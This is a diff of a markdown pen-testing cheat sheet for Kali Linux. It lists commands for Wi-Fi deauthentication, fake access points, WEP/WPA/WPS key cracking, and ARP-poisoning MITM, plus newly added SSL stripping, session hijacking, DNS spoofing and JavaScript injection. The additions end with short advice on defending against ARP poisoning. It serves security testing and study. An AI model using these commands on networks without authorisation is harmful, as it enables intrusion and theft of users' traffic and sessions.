@@ -1,23 +1,23 @@
-#Pen Testing
+# Pen Testing
 
 
-##Table of Contents
+## Table of Contents
 
 1. [Operating System](#operating-system)
-2. [Passive reconaissance](#passive-reconaissance)
+2. [Passive Reconnaissance](#passive-reconnaissance)
 3. [Enabling monitor mode](#enabling-monitor-mode)
 4. [Capturing packets](#capturing-packets)
 5. [Creating Fake AccessPoint](#creating-fake-accesspoint)
-6. [Cracking WEP/WPA/WPA2](#cracking-wep/wpa/wpa2)
-7. [Information Gathering](#information-gathering)
+6. [Cracking WEP WPA WPA2](#cracking-wep-wpa-wpa2)
+7. [Information Gathering upon connected](#information-gathering-upon-connected)
 8. [](#)
 9. [](#)
 
-##Operating System
+## Operating System
 
 Kali Linux does not enable any externally-listening network services, some are installed but need to be enabled prior to use.
 
-###Secure Shell
+### Secure Shell
 
 - Disable default keys and generate a new SSH key pair, backup the old ones.
 
@@ -37,7 +37,7 @@ Kali Linux does not enable any externally-listening network services, some are i
 
 `/etc/init.d/ssh stop`
 
-###Updating Kali
+### Updating Kali
 
 - Adding package repositories
 
@@ -81,9 +81,9 @@ Kali Linux does not enable any externally-listening network services, some are i
 
 `macchanger -OPTIONS`
 
-##Passive Reconnaissance
+## Passive Reconnaissance
 
-###Usefull sites 
+### Usefull sites 
 
 - (www.exploit-db.com/google-dorks)
 
@@ -106,11 +106,11 @@ Kali Linux does not enable any externally-listening network services, some are i
 - site:pastebin.com "targetURL"
 
 
-##Enabling monitor mode
+## Enabling monitor mode
 
 **Card has to be shutdown before changing, use `ifconfig INTERFACE down/up`**
 
-###First method
+### First method
 
 - Changing managed mode on wireless card
 
@@ -120,7 +120,7 @@ Kali Linux does not enable any externally-listening network services, some are i
 
 `airmon-ng stop INTERFACE`
 
-###Second method
+### Second method
 
 - Changing managed mode on wireless card
 
@@ -130,7 +130,7 @@ Kali Linux does not enable any externally-listening network services, some are i
 
 `airmon-ng stop INTERFACE`
 
-###Third method
+### Third method
 
 - Changing managed mode on wireless card
 
@@ -142,7 +142,7 @@ Kali Linux does not enable any externally-listening network services, some are i
 
 `airmon-ng stop INTERFACE`
 
-##Capturing packets
+## Capturing packets
 
 - Show networks
 
@@ -164,13 +164,13 @@ Kali Linux does not enable any externally-listening network services, some are i
 
 `aireplay-ng --deauth 10000 -a NETWORKMAC -c TARGETMAC INTERFACE`
 
-##Creating Fake AccessPoint
+## Creating Fake AccessPoint
 
 - Install mana-toolkit
 
 `apt-get install mana-toolkit`
 
-###AP with internet connection
+### AP with internet connection
 
 - Adjust settings
 
@@ -182,9 +182,9 @@ Kali Linux does not enable any externally-listening network services, some are i
 
 `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 
-##Cracking WEP/WPA/WPA2
+## Cracking WEP WPA WPA2
 
-###WEP with traffic
+### WEP with traffic
 
 - Sniff packets while simultaneous trying to crack key
 
@@ -194,7 +194,7 @@ Kali Linux does not enable any externally-listening network services, some are i
 
 remove the "`:`" from the found key and use it
 
-###WEP with little traffic
+### WEP with little traffic
 
 - Establish fake connection
 
@@ -210,7 +210,7 @@ remove the "`:`" from the found key and use it
 
 `aircrack-ng PATH/FILENAME`
 
-###WPS
+### WPS
 
 - Find any WPS-compatible APs
 
@@ -220,7 +220,7 @@ remove the "`:`" from the found key and use it
 
 `reaver -b NETWORKMAC -c X INTERFACE`
 
-###WPA
+### WPA
 
 - Capture the handshake
 
@@ -238,31 +238,31 @@ e.g. `crunch 6 8 123456abcd!"€$% -o wordlist -t a@@@@b`
 
 `aircrack-ng HANDSHAKEFILE -w WORDLIST`
 
-##Information gathering (once connected)
+##Information gathering upon connected
 
 **place INTERFACE back in managed mode**
 
-###Method 1
+### Method 1
 
 - Capture info (quik)
 
 `netdiscover -i INTERFACE -r IPADDRES/SUBNET`
 
-###Method 2 (needs to be installed)
+### Method 2 (needs to be installed)
 
 - Capture info with graphical interface
 
 `netdiscover -i INTERFACE -r IPADDRES/SUBNET`
 
-###Method 3
+### Method 3
 
 - Capture info (extensive)
 
 `zenmap` Follow the GUI
 
-##Man In The Middle (MITM)
+## Man In The Middle (MITM)
 
-###ARP Poisoning (arpsoof)
+### ARP Poisoning (arpsoof)
 
 - Make the target client believe you are the AP
 
@@ -276,19 +276,50 @@ e.g. `crunch 6 8 123456abcd!"€$% -o wordlist -t a@@@@b`
 
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
 
-###ARP Poisoning (MITMf)
+### ARP Poisoning (MITMf)
 
 - Fool client and AP
 
-`mitmf --arp --spoof --gateway AP_IP --target TARGET_IPs -i INTERFACE`
+`mitmf --arp --spoof  --gateway AP_IP --target TARGET_IPs -i INTERFACE`
 
 - Enable IP forwarding without dropping
 
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
 
+- Redirect https requests to http 
+
+use SSL-strip, mitmf starts this automatically
+
+- Session Hijacking
+
+`apt-get install ferret-sidejack`
+
+`ferret -i INTERFACE`
+
+`hamster`
+
+- DNS Spoofing
+
+Edit the dns-settings you want to change `vim /etc/mitmf/mitmf.conf`
+
+`mitmf --arp --spoof --gateway AP_IP --target TARGET_IP -i INTERFACE --dns`
+
+- Injecting code
+
+`mitmf --arp --spoof --gateway AP_IP --target TARGET_IP -i INTERFACE --inject --js-file PATH/TO/FILE`
+
+### Protect against arp poisoning
+
+- Monitor ip-addresses and mac-address
+
+useful tool is xarp
+
+- Create static arp-tables (you need to manually configure every device)
 
 
-##Useful links
+
+
+## Useful links
 
 (http://www.mediacollege.com/linux/command/linux-command.html)
 
